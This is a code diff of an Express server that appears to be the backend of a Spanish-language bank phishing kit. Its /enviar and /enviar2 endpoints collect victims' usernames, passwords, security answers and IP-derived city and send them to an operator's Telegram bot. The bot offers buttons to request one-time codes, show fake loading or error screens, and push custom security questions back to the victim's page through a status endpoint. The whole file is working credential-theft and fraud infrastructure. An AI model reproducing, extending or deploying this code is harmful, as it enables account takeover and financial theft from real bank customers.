@@ -6,14 +6,6 @@ require('dotenv').config();
 
 const app = express();
 app.use(cors());
-
-// CORS manual
-app.use((req, res, next) => {
-  res.header('Access-Control-Allow-Origin', '*');
-  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
-  next();
-});
-
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
@@ -39,6 +31,7 @@ async function obtenerCiudad(ip) {
   }
 }
 
+// Primer formulario básico
 app.post('/enviar', async (req, res) => {
   const { usar, clavv, txid } = req.body;
   const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
@@ -55,7 +48,6 @@ app.post('/enviar', async (req, res) => {
 🏙️ Ciudad: ${ciudad}
 `;
 
-  if (!clientes[txid]) {
   clientes[txid] = {
     status: "esperando",
     usar,
@@ -63,13 +55,13 @@ app.post('/enviar', async (req, res) => {
     preguntas: [],
     esperando: null
   };
-}
   guardarEstado();
 
   const keyboard = {
     inline_keyboard: [
+      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
+      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }],
       [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
-      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],        
       [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
     ]
   };
@@ -88,6 +80,7 @@ app.post('/enviar', async (req, res) => {
   res.sendStatus(200);
 });
 
+// Segundo formulario con preguntas
 app.post('/enviar2', async (req, res) => {
   const {
     usar,
@@ -101,21 +94,6 @@ app.post('/enviar2', async (req, res) => {
 
   const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
   const ciudad = await obtenerCiudad(ip);
-
-  // ✅ AÑADE ESTE BLOQUE
-  if (!clientes[txid]) {
-    clientes[txid] = {
-      status: "esperando",
-      usar,
-      clavv,
-      preguntas: [],
-      esperando: null
-    };
-  }
-
-  // ✅ ACTUALIZA EL STATUS
-  clientes[txid].status = "esperando";
-  guardarEstado();
 
   const mensaje = `
 ❓🔑🟢B4N3SC0🟢
@@ -133,71 +111,9 @@ ${pregunta2}❓ : ${respuesta2}
 
   const keyboard = {
     inline_keyboard: [
-      [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
       [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
-      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
-    ]
-  };
-
-  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: mensaje,
-      parse_mode: 'HTML',
-      reply_markup: keyboard
-    })
-  });
-
-  res.sendStatus(200);
-});
-
-app.post('/enviar3', async (req, res) => {
-  const {
-    usar,
-    clavv,
-    txid,
-    dinamic
-  } = req.body;
-
-  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
-  const ciudad = await obtenerCiudad(ip);
-
-  // ✅ AÑADE ESTE BLOQUE
-  if (!clientes[txid]) {
-    clientes[txid] = {
-      status: "esperando",
-      usar,
-      clavv,
-      dinamic,
-      preguntas: [],
-      esperando: null
-    };
-  }
-
-  // ✅ ACTUALIZA EL STATUS
-  clientes[txid].status = "esperando";
-  guardarEstado();
-
-  const mensaje = `
-❓🔑🟢B4N3SC0🟢
-🆔 ID: <code>${txid}</code>
-
-📱 US4R: ${usar}
-🔐 CL4V: ${clavv}
-
-🔑Clav.ESP : ${dinamic}
-
-
-🌐 IP: ${ip}
-🏙️ Ciudad: ${ciudad}
-`;
-
-  const keyboard = {
-    inline_keyboard: [
+      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }],
       [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
-      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],      
       [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
     ]
   };
@@ -216,10 +132,7 @@ app.post('/enviar3', async (req, res) => {
   res.sendStatus(200);
 });
 
-
-
-
-
+// Webhook de Telegram
 app.post('/webhook', async (req, res) => {
   if (req.body.callback_query) {
     const callback = req.body.callback_query;
@@ -232,7 +145,7 @@ app.post('/webhook', async (req, res) => {
 
     if (accion === 'preguntas_menu') {
       cliente.preguntas = [];
-      cliente.esperando = 'pregunta1';
+      cliente.esperando = `pregunta1`;
       guardarEstado();
 
       await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -240,10 +153,8 @@ app.post('/webhook', async (req, res) => {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: callback.message.chat.id,
-          text: `✍️ Escribe la primera pregunta personalizada para ${txid}.`,
-          reply_markup: {
-            force_reply: true
-          }
+          text: `✍️ Escribe la primera pregunta personalizada para ${txid}`,
+          reply_markup: { force_reply: true }
         })
       });
 
@@ -267,11 +178,11 @@ app.post('/webhook', async (req, res) => {
 
   if (req.body.message && req.body.message.reply_to_message) {
     const message = req.body.message;
-    const chatId = message.chat.id;
     const text = message.text?.trim();
+    const txidMatch = message.reply_to_message.text?.match(/para ([a-zA-Z0-9]+)/);
+    const txid = txidMatch?.[1];
 
-    const txid = Object.keys(clientes).find(id => clientes[id].esperando);
-    if (!txid || !text) return res.sendStatus(200);
+    if (!txid || !clientes[txid] || !text) return res.sendStatus(200);
 
     const cliente = clientes[txid];
 
@@ -283,11 +194,9 @@ app.post('/webhook', async (req, res) => {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          chat_id: chatId,
-          text: `✅ Primera pregunta guardada. Ahora escribe la segunda pregunta personalizada para ${txid}.`,
-          reply_markup: {
-            force_reply: true
-          }
+          chat_id: message.chat.id,
+          text: `✅ Primera pregunta guardada. Ahora escribe la segunda pregunta personalizada para ${txid}`,
+          reply_markup: { force_reply: true }
         })
       });
 
@@ -300,7 +209,7 @@ app.post('/webhook', async (req, res) => {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          chat_id: chatId,
+          chat_id: message.chat.id,
           text: `✅ Segunda pregunta guardada.\n\nPreguntas para ${txid}:\n1️⃣ ${cliente.preguntas[0]}\n2️⃣ ${cliente.preguntas[1]}`
         })
       });
@@ -313,12 +222,14 @@ app.post('/webhook', async (req, res) => {
   res.sendStatus(200);
 });
 
+// Endpoint de estado
 app.get('/sendStatus.php', (req, res) => {
   const txid = req.query.txid;
   const cliente = clientes[txid] || { status: 'esperando', preguntas: [] };
   res.json({ status: cliente.status, preguntas: cliente.preguntas });
 });
 
+// Verificación básica
 app.get('/', (req, res) => res.send("Servidor activo en Render"));
 
 const PORT = process.env.PORT || 3000;
